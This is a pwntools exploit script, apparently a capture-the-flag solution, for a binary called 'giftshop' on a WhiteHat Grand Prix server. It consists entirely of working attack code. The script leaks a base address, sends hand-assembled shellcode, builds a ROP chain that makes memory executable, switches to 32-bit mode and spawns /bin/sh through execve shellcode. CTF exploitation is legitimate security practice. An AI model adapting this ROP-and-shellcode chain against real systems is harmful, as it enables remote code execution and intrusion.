#r = process('./giftshop')
#raw_input('?')
r = remote('pwn01.grandprix.whitehatvn.com', 26129)

r.recvuntil('OK First, here is a giftcard, it may help you in next time you come here !\n')
base = eval(r.recvline())-0x2030D8
log.info("base: %#x" %base)
r.recvuntil('Can you give me your name plzz ??\n')
r.sendline('\x00')
r.recvline("Enter the receiver's name plzz: \n")
payload = "\x00"*(0x1e0-0x120)
payload += "\x48\x31\xC0\x48\xC7\xC7\x00\x00\x60\x00\x48\xC7\xC6\x00\x30\x00\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x22\x00\x00\x00\x49\xC7\xC0\xFF\xFF\xFF\xFF\x49\xC7\xC1\x00\x00\x00\x00\x48\xC7\xC0\x59\x00\x00\x00\x34\x50\x0F\x05\x48\x31\xC0\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC6\x00\x08\x60\x00\x48\xC7\xC2\x00\x03\x00\x00\x0F\x05\x48\xC7\xC4\x00\x08\x60\x00\xCB"

#0x203000
r.sendline(payload)
r.recvuntil('Your choice:\n')
payload = "10"
payload = payload.ljust(0x10, "\x00")
payload += p64(base+0x203e00) #rbp
payload += p64(base+0x225F) #pop rdi; ret
payload += p64(base+0x203000) #rdi
payload += p64(base+0x2261) #pop rsi; ret
payload += p64(0x1000)
payload += p64(base+0x2265) #pop rdx; ret
payload += p64(7)
#payload += p64(base+0x2267) #pop rax; ret
#payload += p64(10)
payload += p64(base+0x2254) #syscall;ret
payload += p64(base+0x2031E0) #shellcode
r.sendline(payload)

payload = p32(0x600900)+p32(0x23)
payload = payload.ljust(0x100, '\x00')
payload += asm(shellcraft.i386.linux.execve('/bin/sh'), arch='x86')
r.sendline(payload)
r.interactive()
